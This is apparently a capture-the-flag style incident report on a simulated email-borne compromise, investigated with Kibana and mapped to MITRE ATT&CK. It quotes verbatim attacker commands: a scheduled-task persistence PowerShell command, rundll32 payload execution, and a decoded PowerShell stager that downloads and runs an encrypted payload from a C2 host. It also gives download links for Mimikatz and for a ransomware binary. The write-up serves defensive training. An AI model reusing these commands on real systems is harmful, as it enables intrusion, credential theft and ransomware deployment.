# Incident Report - Boogeyman 3

## Overview
**Environment:** Windows

**Captured Artefacts:** `ProjectFinancialSummary_Q3.pdf` (The Malicious Attachment)

**Tools Used:** Elastic (Kibana)

## Introduction

This incident report covers a compromise of a host which started from an e-mail attachment titled `ProjectFinancialSummary_Q3.pdf`. This time, the consequences would be significantly more severe, as the recipient was the CEO of the company. After the CEO `Evan` had opened the attachment, he didn't notice any suspicious activity. So, he reported the incident to the Security Operations team.

---

## Investigation
**Provided Information:**
* The Attachment was opened by the recipient.
* The events occurred between August 29th and August 30th, 2023.

**Investigation Begins**
* After searching for the artefact inside Kibana, `ProjectFinancialSummary_Q3.pdf`, some key details were found:
  * The Process ID of the process that executed the initial stage 1 payload was `6392`.
  * The payload attempted to implant a file, titled `review.dat`, in another location with the following command: `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat`
  * The payload was then run using the following command: `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer`
  * The payload then created a scheduled task to run everyday at (6:00) and execute `rundll32.exe` to load `review.dat` and invoke an exported function titled `DllRegisterServer`: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;`
* Using a filter to sort for network logs using Sysmon, 
  * **Filter used:** `event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3`
  * When the implanted file successfully executed, it established a C2 connection with the IPv4 address `165.232.170.151` over the port `80`.
* The attacker attempted to bypass the UAC with a Windows executable named `fodhelper.exe` after having discovered that their current access was a local administrator.
* The attacker then proceeded to dump the credentials inside the machine after downloading a well-known credential dumping tool `Mimikatz` from the link: `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`
  * The credentials the attacker dumped were for the account `itadmin` with the NTLM hash `[REDACTED]`.
* With the brand new credentials, the attacker attempted to enumerate all the accessible file shares and accessed a file called `IT_Automation.ps1`.
  * The attacker obtained the credentials for the account `QUICKLOGISTICS\allan.smith` with the password `[REDACTED]` from the `IT_Automation.ps1` file, and proceeded to move laterally.
* Under the `-ComputerName` header, it was revealed that the attacker's target machine for the lateral movement attempt was named `WKSTN-1327`.
* Using the filter `WKSTN-1327 and event.provider: "Microsoft-Windows-Sysmon" and event.code: 1`, the processes running on `WKSTN-1327` were analyzed. A Base64 UTF-16LE encoded command was found being executed by `powershell.exe` which had `wsmprovhost.exe` as the parent process:
  * **Decoded:** `If($PSVersionTable.PSVersion.Major -ge 3){};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAcABhAHIAdAB5AC4AbgBlAHQAOgA4ADAA')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('}wS1&VNqoIY*G#5-Plv{p2f=4Z?uat@<');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","rlkHVXWbb=13cfco9rUXx0i4J3xTu682JFiX0=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX`
    * Within this massive base64 decoded command, there is another string which is also base64 encoded:
      * **Encoded:** `aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAcABhAHIAdAB5AC4AbgBlAHQAOgA4ADAA`
      * **Decoded:** `hxxp://cdn[.]bananapeelparty[.]net:80` which gets appended with the url `/admin/get.php` to form the full download URL.
* The attacker then proceeded to dump the credentials inside this second machine as well, using mimikatz.
  * The credentials were dumped for the user `administrator` with the hash `[REDACTED]`.
* After this, the attacker gained access to the Domain Controller and proceeded to dump the hashes via a DCSync attack, which also included the credentials of another account, `backupda`.
* After dumping all the credentials, the attacker proceeded to attempt downloading a ransomware binary from the following link: `hxxp://ff[.]sillytechninja[.]io/ransomboogey[.]exe`.

## MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID | Evidence |
|---|---|---|---|
| Execution | User Execution: Malicious File | T1204.002 | The recipient opened the malicious PDF attachment, initiating the attack chain. |
| Defense Evasion | System Binary Proxy Execution: Rundll32 | T1218.011 | `rundll32.exe` was used to load `review.dat` and invoke its `DllRegisterServer` export. |
| Execution, Persistence, Privilege Escalation | Scheduled Task/Job: Scheduled Task | T1053.005 | A scheduled task named `Review` was registered to execute `review.dat` daily at 06:00. |
| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass User Account Control | T1548.002 | The attacker attempted to bypass UAC using `fodhelper.exe`. |
| Command and Control | Ingress Tool Transfer | T1105 | Mimikatz was downloaded from its GitHub release URL. The attacker also attempted to download a ransomware binary. |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | Mimikatz was used to dump credentials from LSASS memory on the initial machine and the second workstation. |
| Discovery | Network Share Discovery | T1135 | The attacker enumerated accessible file shares before accessing `IT_Automation.ps1`. |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | Credentials for `QUICKLOGISTICS\allan.smith` were discovered in `IT_Automation.ps1`. |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | `wsmprovhost.exe` was the parent process of PowerShell on `WKSTN-1327`, consistent with execution through WinRM. |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell was used to create the scheduled task and execute the Base64-encoded command on the remote workstation. |
| Credential Access | OS Credential Dumping: DCSync | T1003.006 | The attacker performed a DCSync attack against the Domain Controller to obtain domain credential material. |

## Conclusion

This report covered the different stages of the attack life-cycle which began from a malicious attachment inside an e-mail. Opening this attachment led to the attacker gaining access to the victim host's workstation and began establishing persistence with implanted files and scheduled tasks. After this, the attacker proceeded to dump the credentials inside the host's workstation, then moving laterally to other workstations on the network and dumping credentials there as well. After all this, the attacker gained access to the domain controller and proceeded to dump more credentials via a DCSync attack, then attempted to download a ransomware binary named `ransomboogey.exe`.

The Boogeyman trilogy showed just how easy it is for an attacker to gain access to a system and wreak havoc by something as seemingly small as an e-mail attachment, which makes it even more necessary to provide employees with proper training to avoid dire consequences.
